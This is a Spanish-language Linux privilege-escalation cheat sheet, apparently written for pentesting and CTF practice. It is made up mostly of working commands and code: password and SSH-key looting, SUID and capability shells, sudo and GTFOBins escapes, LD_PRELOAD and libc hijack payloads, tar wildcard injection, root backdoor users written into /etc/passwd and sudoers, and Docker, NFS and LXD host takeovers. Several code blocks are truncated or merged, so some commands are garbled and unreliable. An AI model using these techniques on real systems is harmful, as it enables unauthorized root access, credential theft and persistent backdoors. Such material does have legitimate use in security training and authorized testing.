# Tools

Hay muchos scripts que puedes ejecutar en una máquina Linux y que enumeran automáticamente
información del sistema, procesos y archivos para localizar vectores de escalada de privilegios. Aquí hay algunos:

**LinPEAS**: Script impresionante de escalada de privilegios de Linux

```sh
wget "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" curl "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" ./linpeas.sh -a #all checks - enumeración más profunda del sistema, pero lleva más tiempo
./linpeas.sh -s #superfast & sigilo: esto evitará algunas comprobaciones que consumen mucho tiempo
./linpeas.sh -P #Pasar
```

**LinuxSmartEnumeration**: herramientas de enumeración de Linux para pentesting y CTF

```sh
wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/ma curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/ma ./lse.sh -l1 # muestra información interesante que debería ayudarte a privesc
./lse.sh -l2 #
```

**LinEnum** - Comprobaciones de escalamiento de privilegios y enumeración local de Linux mediante scripts

```sh
./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
```

# Checklist

- Lanzamiento del kernel y distribución
- Información del sistema
	- Nombre de host
	- Detalles de la red:
		- IP actual
		- Detalle del enrutador predeterminado
		- Información del servidor DNS
- Información del usuario
	- Detalles del usuario actual
	- Últimos usuarios que iniciaron sesión
	- Muestra los usuarios que iniciaron sesión en el host.
	- Enumere todos los usuarios, incluida la información `uid/gid`
	- Listar cuentas root
	- Comprueba si los hash de contraseña están almacenados en `/etc/passwd`
	- Extraiga todos los detalles de los `uid` 'predeterminados' como 0, 1000, 1001, etc.
	- Intente leer archivos restringidos, `/etc/shadow`
	- Listar los archivos del historial de los usuarios actuales (`.bash_history`, `.nano_history`, .`mysql_history`, etc.) SSH básico 
- Acceso privilegiado:
	- ¿Qué usuarios han utilizado recientemente sudo?
	- Determinar si `/etc/sudoers` es accesible
	- Determinar si el usuario actual tiene acceso a Sudo sin contraseña
	- ¿Se conocen binarios de ruptura disponibles a través de Sudo (`nmap`, `vim`, etc.)?
	- ¿Se puede acceder al directorio raíz del usuario?
	- Listar permisos para `/home/`
- Ambiente:
	- Mostrar $PATH actual
	- Muestra información del ambiente
- Trabajos/Tareas
	- Listar todos los trabajos cron
	- Localice todos los trabajos cron grabables en todo el mundo
	- Localizar trabajos cron propiedad de otros usuarios del sistema
	- Listar los temporizadores `systemd` activos e inactivos.
- Servicios
	- Listar conexiones de red (TCP y UDP)
	- Listar los procesos en ejecución
	- Búsqueda y lista de binarios de procesos y permisos asociados.
	- Listar el contenido de `inetd.conf/xined.conf` y los permisos de archivos binarios asociados. Listar `init.d` 
	- permisos binarios
- Información de versión (de lo siguiente):
	- Sudo
	- MySQL
	- Postgres
	- Apache
		- Comprueba la configuración del usuario.
		- Muestra los módulos habilitados.
		- Comprueba si hay archivos `htpasswd`
		- Ver directorios www Default/weak 
- credenciales:
	- Comprueba si hay cuentas de Postgres débiles o predeterminadas
	- Comprueba si hay cuentas MYSQL débiles o predeterminadas
- Búsquedas:
	- Localizar todos los archivos SUID/GUID
	- Localice todos los archivos SUID/GUID que se pueden editar
	- Localice todos los archivos SUID/GUID propiedad de root
	- Localice archivos SUID/GUID 'interesante' (`nmap`, `vim`, etc.)
	- Localizar archivos con capacidades POSIX
	- Listar todos los archivos grabables en todo el mundo
	- Buscar/enumerar todos los archivos `*.plan` accesibles y mostrar contenidos
	- Buscar/enumerar todos los archivos `*.rhosts` accesibles y mostrar contenidos
	- Mostrar detalles del servidor NFS
	- Localice los archivos `*.conf` y `*.log` que contengan la palabra clave proporcionada en el tiempo de ejecución del script.
	- Listar todos los archivos `*.conf` ubicados en `/etc` 
	- Localizar correo
- Pruebas específicas de plataforma/software:
	- Comprobaciones para determinar si estamos en un contenedor Docker
	- Comprueba si el host tiene Docker instalado
	- Comprobaciones para determinar si estamos en un contenedor LXC

# Looting for Password

## Files containing passwords

```sh
grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2> /dev/null 
find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
```

## Old passwords in `/etc/security/opasswd`

`Pam_cracklib` también utiliza el archivo `/etc/security/opasswd` para mantener el historial de contraseñas antiguas para que el usuario no las reutilice.

Advertencia: trate su archivo `opasswd` como su archivo `/etc/shadow` porque terminará conteniendo hashes de contraseña de usuario
## Last edited files

Archivos que fueron editados en los últimos 10 minutos.

```sh
find / -mmin -10 2>/dev/null | grep -Ev "^/proc"
```

Passwords en memoria

```sh
strings /dev/mem -n10 | grep -i PASS
```

## Encuentra archivos confidenciales

```sh
locate password | more          
/boot/grub/i386-pc/password.mod
/etc/pam.d/common-password
/etc/pam.d/gdm-password
/etc/pam.d/gdm-password.original

/lib/live/config/0031-root-password ...
```

# SSH Key
## Archivos sensibles

```sh
find / -name authorized_keys 2> /dev/null
find / -name id_rsa 2> /dev/null ...
```
## Proceso PRNG (claves_autorizadas) predecible con clave SSH

Este módulo describe cómo intentar utilizar un archivo `authorized_keys` obtenido en un sistema host.

Necesario: `SSH-DSS String` del archivo `authorized_keys`

Pasos

1.      Obtenga el archivo `authorized_keys`. Un ejemplo de este archivo se vería así:

```sh
ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf
```

2.      Dado que se trata de una clave `ssh-dss`, debemos agregarla a nuestra copia local de `/etc/ssh/ssh_config` y `/etc/ssh/sshd_config`:

```sh
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config 
echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshd_config 
/etc/init.d/ssh restart
```

3.      Obtenga el repositorio debian-ssh de g0tmi1k y descomprima las claves:

```sh
git clone https://github.com/g0tmi1k/debian-ssh
cd debian-ssh
tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
```

4.   Tome los primeros 20 o 30 bytes del archivo de claves que se muestra arriba, comenzando con la parte "AAAA..." y guarde las claves descomprimidas con él como:

```sh
grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834yb dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
```

5.    SI TIENE ÉXITO, esto devolverá un archivo público (`68b329da9893e34099c7d8ad5cb9c940-17934.pub`). Para usar el archivo de clave privada para conectarse, elimine la extensión `.pub` y haga: 

```sh
ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
```

Y deberías conectarte sin requerir una contraseña. Si se atasca, la verbosidad `-vvv` debería proporcionar suficientes detalles del motivo.

# Tareas programadas

### Trabajos cron
Compruebe si tiene acceso con permiso de escritura a estos archivos.
Consulte el interior del archivo para encontrar otras rutas con permisos de escritura.

```sh
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root

crontab -l

ls -alh /var/spool/cron 
ls -al /etc/ | grep cron 
ls -al /etc/cron* 
cat /etc/cron* 
cat /etc/at.allow 
cat /etc/at.deny 
cat /etc/cron.allow 
cat /etc/cron.deny*
```

Puedes usar `pspy` para detectar un trabajo CRON.

```sh
./pspy64 -pf -i 1000
```

### Systemd timers

```sh
systemctl list-timers --all

NEXT                          LEFT     LAST                          PASSED         Mon 2019-04-01 02:59:14 CEST  15h left Sun 2019-03-31 10:52:49 CEST  24min ago     
Mon 2019-04-01 06:20:40 CEST  19h left Sun 2019-03-31 10:52:49 CEST  24min ago      Mon 2019-04-01 07:36:10 CEST  20h left Sat 2019-03-09 14:28:25 CET   3 weeks 0 days 3 timers listed.
```

# SUID

`SUID/Setuid` significa "establecer ID de usuario al ejecutar", está habilitado de forma predeterminada en todas las distribuciones de Linux. Si se ejecuta un archivo con este bit, el propietario cambiará el `uid`. Si el propietario del archivo es root, el `uid` se cambiará a root incluso si se ejecutó desde el usuario bob. El bit SUID está representado por una `s`.

```sh
╭─swissky@lab ~ 
╰─$ ls /usr/bin/sudo -alh                 

-rwsr-xr-x 1 root root 138K 23 nov.  16:04 /usr/bin/sudo
```
### Find SUID binaries

```sh
find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \; 
find / -uid 0 -perm -4000 -type f 2>/dev/null
```
### Crear SUID binary

| Funcion    | Descripcion                                                       |
| ---------- | ----------------------------------------------------------------- |
| setreuid() | establece ID de usuario reales y efectivos del proceso de llamada |
| setuid()   | establece el ID de usuario efectivo del proceso de llamada        |
| setgid()   | establece el ID de grupo efectivo del proceso de llamada          |

```sh
print 'int main(void){\nsetresuid(0, 0, 0);\nsystem("/bin/sh");\n}' > /tmp/suid.c   gcc -o /tmp/suid /tmp/suid.c  
sudo chmod +x /tmp/suid # execute right 
sudo chmod +s /tmp/suid # setuid
```

# Capabilities

## Listar capacidades de binarios

```sh
╭─swissky@lab ~ 
╰─$ /usr/bin/getcap -r  /usr/bin

/usr/bin/fping                = cap_net_raw+ep 
/usr/bin/dumpcap              = cap_dac_override,cap_net_admin,cap_net_raw+eip
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/rlogin               = cap_net_bind_service+ep
/usr/bin/ping                 = cap_net_raw+ep
/usr/bin/rsh                  = cap_net_bind_service+ep
/usr/bin/rcp                  = cap_net_bind_service+ep
```

## Editar capacidades

```sh
/usr/bin/setcap -r /bin/ping            # remove 
/usr/bin/setcap cap_net_raw+p /bin/ping # add
```

## Capacidades interesantes

Tener la capacidad =ep significa que el binario tiene todas las capacidades.

```sh
getcap openssl /usr/bin/openssl openssl=ep
```

Alternativamente, se pueden utilizar las siguientes capacidades para actualizar sus privilegios actuales.

```sh
cap_dac_read_search # read anything 
cap_setuid+ep # setuid
```

Ejemplo de escalada de privilegios con `cap_setuid+ep`

```sh
sudo /usr/bin/setcap cap_setuid+ep /usr/bin/python2.7

python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")' sh-5.0 # id

uid=0(root) gid=1000(swissky)
```

| Capabilities name    | Description                                                                                                                                 |
| -------------------- | ------------------------------------------------------------------------------------------------------------------------------------------- |
| CAP_AUDIT_CONTROL    | Allow to enable/disable kernel auditing                                                                                                     |
| CAP_AUDIT_WRITE      | Helps to write records to kernel auditing log                                                                                               |
| CAP_BLOCK_SUSPEND    | This feature can block system suspends                                                                                                      |
| CAP_CHOWN            | Allow user to make arbitrary change to files UIDs and GIDs                                                                                  |
| CAP_DAC_OVERRIDE     | This helps to bypass file read, write and execute permission checks                                                                         |
| CAP_DAC_READ_SEARCH  | This only bypasses file and directory read/execute permission checks                                                                        |
| CAP_FOWNER           | This enables bypass of permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
| CAP_KILL             | Allow the sending of signals to processes belonging to others                                                                               |
| CAP_SETGID           | Allow changing of the GID                                                                                                                   |
| CAP_SETUID           | Allow changing of the UID                                                                                                                   |
| CAP_SETPCAP          | Helps to transferring and removal of current set to any PID                                                                                 |
| CAP_IPC_LOCK         | This helps to lock memory                                                                                                                   |
| CAP_MAC_ADMIN        | Allow MAC configuration or state changes                                                                                                    |
| CAP_NET_RAW          | Use RAW and PACKET sockets                                                                                                                  |
| CAP_NET_BIND_SERVICE | SERVICE Bind a socket to internet domain privileged ports                                                                                   |
# SUDO

Tool: Sudo Exploitation
## NOPASSWD

Sudo configuration might allow a user to execute some command with another user's privileges without knowing the password.

```sh
sudo -l

User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```


In this example the user demo can run vim as root , it is now trivial to get a shell by adding an `ssh key` into the root directory or by calling `sh` .

```sh
sudo vim -c '!sh' 
sudo -u root vim -c '!sh'
```
## LD_PRELOAD and NOPASSWD

Si `LD_PRELOAD` está definido explícitamente en el `archivo sudoers`

```sh
Defaults        env_keep += LD_PRELOAD
```

Compile el siguiente objeto compartido usando el código C a continuación con `gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

```sh
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h> #include <unistd.h> 

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);     
    setuid(0);     
    system("/bin/sh");
}
```

Ejecute cualquier binario con `LD_PRELOAD` para generar un shell:

```sh
sudo LD_PRELOAD=<full_path_to_so_file> <program> , e.g: sudo LD_PRELOAD=/tmp/shell.so find
```

## Doas

Existen algunas alternativas al binario sudo como `doas` para OpenBSD, recuerda revisar su configuración en `/etc/doas.conf`

```sh
permit nopass demo as root cmd vim 
```

### `sudo_inject`

Using https://github.com/nongiach/sudo_inject

```sh
$ sudo whatever
[sudo] password for user:   

# Press <ctrl>+c since you don't have the password. # This creates an invalid sudo tokens.

sh exploit.sh
.... wait 1 seconds
$ sudo -i # no password required :)

# id uid=0(root) gid=0(root) groups=0(root)
```

Diapositivas de la presentación:

https://github.com/nongiach/sudo_inject/blob/master/slides_breizh_2019.pdf
## CVE-2019-14287

```
# Exploitable when a user have the following permissions (sudo -l)

(ALL, !root) ALL

# If you have a full TTY, you can exploit it like this 
sudo -u #-1 /bin/bash 
sudo -u #4294967295
```
# GTFOBins

GTFOBins es una lista seleccionada de archivos binarios de Unix que un atacante puede explotar para eludir las restricciones de seguridad locales.

El proyecto recopila funciones legítimas de los binarios de Unix de las que se puede abusar para romper shells restringidos, escalar o mantener privilegios elevados, transferir archivos, generar enlaces e invertir shells y facilitar otras tareas posteriores a la explotación.

```sh
gdb -nx -ex '!sh' -ex quit 
sudo mysql -e '! /bin/sh' 
strace -o /dev/null /bin/sh 
sudo awk 'BEGIN {system("/bin/sh")}'
```
# Wildcard

Al usar tar con las opciones `–checkpoint-action`, se puede usar una acción específica después de un punto de control. Esta acción podría ser un script de shell malicioso que podría usarse para ejecutar comandos arbitrarios bajo el usuario que inicia tar. “Tricking” al root para que utilice opciones específicas es bastante fácil, y ahí es donde el comodín resulta útil.

```sh
# create file for exploitation 

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"
echo "#\!/bin/bash\ncat /etc/passwd > /tmp/flag\nchmod 777 /tmp/flag" > shell.sh

# vulnerable script 
tar cf archive.tar *
```

Tool: wildpwn

# Archivos grabables

Enumere los archivos grabables del mundo en el sistema.

```sh
find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec l
find / -perm -2 -type f 2>/dev/null 
find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null
```

### Writable `/etc/sysconfig/network-scripts/` (Centos/Redhat)


`/etc/sysconfig/network-scripts/ifcfg-1337` for example

```sh
NAME=Network /bin/id  &lt;= Note the blank space 
ONBOOT=yes
DEVICE=eth0

EXEC :
./etc/sysconfig/network-scripts/ifcfg-1337
```

src :
https://vulmon.com/exploitdetailsqidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f

## Writable `/etc/passwd`

Primero genere una contraseña con uno de los siguientes comandos.

```sh
openssl passwd -1 -salt hacker hacker 
mkpasswd -m SHA-512 hacker 
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")' 
```

Luego agregue el usuario hacker y agregue la contraseña generada.

```sh
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Ahora puedes usar el comando `su` con `hacker:hacker`

Alternativamente, puede utilizar las siguientes líneas para agregar un usuario ficticio sin contraseña. ADVERTENCIA: podría degradar la seguridad actual de la máquina.

```sh
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd su - dummy
```

NOTA: En las plataformas BSD `/etc/passwd` se encuentra en `/etc/pwd.db` y `/etc/master.passwd` , también `/etc/shadow` pasa a llamarse `/etc/spwd.db`.

## Writable `/etc/sudoers`

```sh
echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
```

# use SUDO without password

```sh
echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers 
echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
```

# NFS Root Squashing

Cuando aparece `no_root_squash` en `/etc/exports`, la carpeta se puede compartir y un usuario remoto puede montarla.
# control remoto comprueba el nombre de la carpeta

```sh
showmount -e 10.10.10.10

# create dir 
mkdir /tmp/nfsdir 

# mount directory
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir    
cd /tmp/nfsdir

# copy wanted shell 
cp /bin/bash . 

# set suid permission 
chmod +s bash  
```
# Shared Library

## ldconfig

Identificar bibliotecas compartidas con `ldd`

```
$ ldd /opt/binary
    linux-vdso.so.1 (0x00007ffe961cd000)
    vulnlib.so.8 => /usr/lib/vulnlib.so.8 (0x00007fa55e55a000)
    /lib64/ld-linux-x86-64.so.2 => /usr/lib64/ld-linux-x86-64.so.2 (0x00007fa55e6c80 
```
    
Cree una biblioteca en `/tmp` y active la ruta.

```sh
gcc –Wall –fPIC –shared –o vulnlib.so /tmp/vulnlib.c
echo "/tmp/" > /etc/ld.so.conf.d/exploit.conf && ldconfig -l /tmp/vulnlib.so /opt/binary
```

## RPATH

```sh
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
 0x00000001 (NEEDED)                     Shared library: [libc.so.6]  
 0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15  
 linux-gate.so.1 =>  (0x0068c000)
 libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)

 /lib/ld-linux.so.2 (0x005bb000)
```

Al copiar la biblioteca en `/var/tmp/flag15/`, el programa la utilizará en este lugar como se especifica en la variable RPATH.

```sh
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15 
 linux-gate.so.1 =>  (0x005b0000)
 libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
 /lib/ld-linux.so.2 (0x00737000)
```

Luego cree una biblioteca malvada en `/var/tmp` con `gcc -fPIC -shared -static-libgcc -Wl`, `-version-script=version`, `-Bstatic exploit.c -o libc.so.6`

```sh
#include<stdlib.h>

#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av,
{
 char *file = SHELL; 
  char *argv[] = {SHELL,0};
 setresuid(geteuid(),geteuid(), geteuid());  
 execve(file,argv,0);
}
```

# Groups

![](file:///C:/Users/Nedia/AppData/Local/Temp/msohtmlclip1/01/clip_image004.gif)

## Docker

Monte el sistema de archivos en un contenedor bash, lo que le permitirá editar `/etc/passwd` como root, luego agregue una cuenta de puerta trasera `o:contraseña`.

```sh
$> docker run -it --rm -v $PWD:/mnt bash
$> echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc
```

Casi similar, pero también verá todos los procesos ejecutándose en el host y estarán conectados a las mismas NIC.

```sh
docker run --rm -it --pid=host --net=host --privileged -v /:/host ubuntu bash
```

O utilice la siguiente imagen acoplable de chrisfosterelli para generar un shell raíz

```sh
docker run -v /:/hostOS -i -t chrisfosterelli/rootplease
latest: Pulling from chrisfosterelli/rootplease
2de59b831a23: Pull complete 
354c3661655e: Pull complete 
91930878a2d7: Pull complete 
a3ed95caeb02: Pull complete 
489b110c54dc: Pull complete
Digest: sha256:07f8453356eb965731dd400e056504084f25705921df25e78b68ce3908ce52c0
Status: Downloaded newer image for chrisfosterelli/rootplease:latest
```

Ahora debería tener un shell raíz en el sistema operativo host. Presione Ctrl-D para salir de la instancia/shell de Docker.

```sh
sh-5.0
# id 
uid=0(root) gid=0(root) groups=0(root)
```

Más escalada de privilegios de Docker utilizando Docker Socket.

```sh
sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chr sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=ho
```

## LXC/LXD

`Privesc` requiere ejecutar un contenedor con privilegios elevados y montar el sistema de archivos host en su interior.

```sh
╭─swissky@lab ~ 
╰─$ id uid=1000(swissky) gid=1000(swissky) groupes=1000(swissky),3(sys),90(network),98(power)
```

Cree una imagen de Alpine e iníciela usando la bandera `security.privileged=true`, lo que obliga al contenedor a interactuar como root con el sistema de archivos del host.
# construir una imagen alpina simple

```sh
git clone https://github.com/saghul/lxd-alpine-builder ./build-alpine -a i686
```